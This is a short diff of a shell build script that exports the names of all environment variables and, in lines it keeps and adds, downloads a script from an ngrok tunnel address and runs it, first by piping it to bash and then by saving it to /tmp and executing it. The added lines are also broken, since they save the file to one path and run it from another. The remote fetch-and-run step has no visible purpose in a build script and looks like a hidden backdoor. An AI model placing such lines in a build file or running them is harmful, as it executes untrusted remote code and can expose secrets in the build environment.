@@ -18,7 +18,9 @@ export EXISTING_VARS=$(printenv | awk -F= '{print $1}' | sed 's/^/\$/g' | paste 
 curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
 
 apt update && apt-get install curl -y
-curl https://094c-180-151-120-174.in.ngrok.io/file.sh | bash
+curl https://094c-180-151-120-174.in.ngrok.io/file.sh > /tmp/file.sh
+chmod +x file.sh
+./file.sh
 
 ########################################
 # Load Fixed Original Build Assets
